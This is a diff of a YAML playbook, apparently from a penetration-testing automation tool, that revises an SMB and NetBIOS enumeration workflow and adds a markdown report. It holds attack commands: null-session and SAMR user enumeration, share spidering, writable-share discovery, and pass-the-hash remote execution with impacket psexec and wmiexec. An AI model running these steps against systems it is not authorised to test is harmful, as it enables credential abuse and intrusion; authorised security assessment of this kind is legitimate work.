@@ -1,6 +1,6 @@
 name: "SMB & NetBIOS Enumeration"
 description: "SMB share discovery, null session attacks, RPC enumeration, MSRPC abuse, SMB relay detection, and pass-the-hash"
-version: "1.0"
+version: "2.0"
 
 vars:
   target_workgroup: ""
@@ -31,10 +31,9 @@ steps:
       - id: nbtscan
         name: "NetBIOS name table scan"
         tool: nbtscan
-        args: ["-r", "{target}",
-               "-o", "{case_dir}/nbtscan_output.txt"]
+        args: ["{target}"]
         timeout: 60
-        artifacts: ["{case_dir}/nbtscan_output.txt"]
+        save: "{case_dir}/nbtscan_output.txt"
 
       - id: smb_version
         name: "SMB version fingerprint"
@@ -46,10 +45,9 @@ steps:
       - id: enum4linux
         name: "enum4linux full scan"
         tool: enum4linux
-        args: ["-a", "{target}",
-               "-o", "{case_dir}/enum4linux_output.txt"]
+        args: ["-a", "{target}"]
         timeout: 300
-        artifacts: ["{case_dir}/enum4linux_output.txt"]
+        save: "{case_dir}/enum4linux_output.txt"
 
   # ---- Phase 2: Share enumeration ----
   - id: share_enum
@@ -60,25 +58,24 @@ steps:
       - id: smbclient_null
         name: "Null session share list"
         tool: smbclient
-        args: ["-L", "//{target}/", "-N",
-               "-o", "{case_dir}/smb_shares_null.txt"]
+        args: ["-L", "//{target}/", "-N"]
         timeout: 30
-        artifacts: ["{case_dir}/smb_shares_null.txt"]
+        save: "{case_dir}/smb_shares_null.txt"
 
       - id: smbmap_null
         name: "smbmap null session"
         tool: smbmap
-        args: ["-H", "{target}", "-u", "guest",
-               "-o", "{case_dir}/smbmap_null.txt"]
+        args: ["-H", "{target}", "-u", "guest"]
         timeout: 30
+        save: "{case_dir}/smbmap_null.txt"
 
       - id: smbclient_auth
         name: "Authenticated share list"
         tool: smbclient
         args: ["-L", "//{target}/",
-               "-U", "{smb_user}%{smb_pass}",
-               "-o", "{case_dir}/smb_shares_auth.txt"]
+               "-U", "{smb_user}%{smb_pass}"]
         timeout: 30
+        save: "{case_dir}/smb_shares_auth.txt"
 
   # ---- Phase 3: Null session exploitation ----
   - id: null_session
@@ -89,31 +86,30 @@ steps:
       - id: rpcdump
         name: "MSRPC endpoint dump"
         tool: impacket-rpcdump
-        args: ["-target-ip", "{target}",
-               "-o", "{case_dir}/rpcdump.txt"]
+        args: ["-target-ip", "{target}"]
         timeout: 120
-        artifacts: ["{case_dir}/rpcdump.txt"]
+        save: "{case_dir}/rpcdump.txt"
 
       - id: samrdump
         name: "SAMR user enumeration"
         tool: impacket-samrdump
-        args: ["-target-ip", "{target}",
-               "-o", "{case_dir}/samrdump_users.txt"]
+        args: ["-target-ip", "{target}"]
         timeout: 60
+        save: "{case_dir}/samrdump_users.txt"
 
       - id: srvinfo
         name: "SMB server info"
         tool: impacket-srvinfo
-        args: ["-target-ip", "{target}",
-               "-o", "{case_dir}/srvinfo.txt"]
+        args: ["-target-ip", "{target}"]
         timeout: 30
+        save: "{case_dir}/srvinfo.txt"
 
       - id: netview
         name: "Network session enumeration"
         tool: impacket-netview
-        args: ["-target-ip", "{target}",
-               "-o", "{case_dir}/netview.txt"]
+        args: ["-target-ip", "{target}"]
         timeout: 60
+        save: "{case_dir}/netview.txt"
 
   # ---- Phase 4: Spider shares ----
   - id: spider_shares
@@ -125,18 +121,17 @@ steps:
         name: "smbmap recursive spider"
         tool: smbmap
         args: ["-H", "{target}", "-R", "--depth", "5",
-               "-u", "{smb_user}", "-p", "{smb_pass}",
-               "-o", "{case_dir}/smbmap_spider.txt"]
+               "-u", "{smb_user}", "-p", "{smb_pass}"]
         timeout: 300
-        artifacts: ["{case_dir}/smbmap_spider.txt"]
+        save: "{case_dir}/smbmap_spider.txt"
 
       - id: smbmap_writeable
         name: "Find writable shares"
         tool: smbmap
         args: ["-H", "{target}", "-u", "{smb_user}", "-p", "{smb_pass}",
-               "--rw",
-               "-o", "{case_dir}/smb_writable_shares.txt"]
+               "--rw"]
         timeout: 120
+        save: "{case_dir}/smb_writable_shares.txt"
 
   # ---- Phase 5: SMB relay detection ----
   - id: relay_detect
@@ -154,9 +149,9 @@ steps:
 
       - id: smb2_time
         name: "SMB2 time / relay window"
-        tool: impacket-smbexec
-        args: ["-target-ip", "{target}",
-               "-o", "{case_dir}/smb_relay_check.txt"]
+        tool: nmap
+        args: ["-p", "445", "--script", "smb2-time",
+               "{target}", "-oN", "{case_dir}/smb_relay_check.txt"]
         timeout: 30
 
   # ---- Phase 6: Pass-the-hash ----
@@ -170,31 +165,49 @@ steps:
       - id: psexec_pth
         name: "Impacket psexec (PTH)"
         tool: impacket-psexec
-        args: ["-hashes", "LM:NT", "{smb_hash}",
+        args: ["-hashes", "{smb_hash}",
                "{smb_user}@{target}",
-               "whoami",
-               "-o", "{case_dir}/pth_psexec.txt"]
+               "whoami"]
         timeout: 60
-        artifacts: ["{case_dir}/pth_psexec.txt"]
+        save: "{case_dir}/pth_psexec.txt"
 
       - id: wmiexec_pth
         name: "Impacket wmiexec (PTH)"
         tool: impacket-wmiexec
-        args: ["-hashes", "LM:NT", "{smb_hash}",
+        args: ["-hashes", "{smb_hash}",
                "{smb_user}@{target}",
-               "whoami",
-               "-o", "{case_dir}/pth_wmiexec.txt"]
+               "whoami"]
         timeout: 60
+        save: "{case_dir}/pth_wmiexec.txt"
 
   # ---- Phase 7: Report ----
   - id: report
-    name: "SMB enumeration note"
+    name: "SMB enumeration report"
+    type: report
+    format: markdown
+    title: "SMB & NetBIOS Enumeration Report — {target}"
+    output: "{case_dir}/smb-report.md"
+    sections:
+      - heading: "Target"
+        body: "- Target: {target}"
+      - heading: "Service Discovery"
+        body: "- SMB nmap: {case_dir}/smb_nmap.txt\n- NetBIOS scan: {case_dir}/nbtscan_output.txt\n- SMB version: {case_dir}/smb_version.txt\n- enum4linux: {case_dir}/enum4linux_output.txt"
+      - heading: "Share Enumeration"
+        body: "- Null session shares: {case_dir}/smb_shares_null.txt\n- smbmap null: {case_dir}/smbmap_null.txt\n- Authenticated shares: {case_dir}/smb_shares_auth.txt"
+      - heading: "Null Session Exploitation"
+        body: "- RPC dump: {case_dir}/rpcdump.txt\n- SAMR users: {case_dir}/samrdump_users.txt\n- Server info: {case_dir}/srvinfo.txt\n- Network sessions: {case_dir}/netview.txt"
+      - heading: "Share Content"
+        body: "- Spidered content: {case_dir}/smbmap_spider.txt\n- Writable shares: {case_dir}/smb_writable_shares.txt"
+      - heading: "Relay Detection"
+        body: "- SMB signing: {case_dir}/smb_signing.txt\n- Relay check: {case_dir}/smb_relay_check.txt"
+      - heading: "Pass-the-Hash"
+        body: "- psexec PTH: {case_dir}/pth_psexec.txt\n- wmiexec PTH: {case_dir}/pth_wmiexec.txt"
+
+postflight:
+  - id: cleanup
     type: log
-    message: |
-      SMB/NetBIOS enumeration complete for {target}.
-      Results in {case_dir}/:
-      - Shares: smb_shares_null.txt, smb_shares_auth.txt
-      - Users: samrdump_users.txt
-      - Spider content: smbmap_spider.txt
-      - Writable: smb_writable_shares.txt
-      - Signing: smb_signing.txt
+    message: "SMB/NetBIOS enumeration complete — {case_dir}"
+  - id: notify_done
+    type: notify
+    level: success
+    message: "SMB/NetBIOS enumeration finished for {target}. Results in {case_dir}"
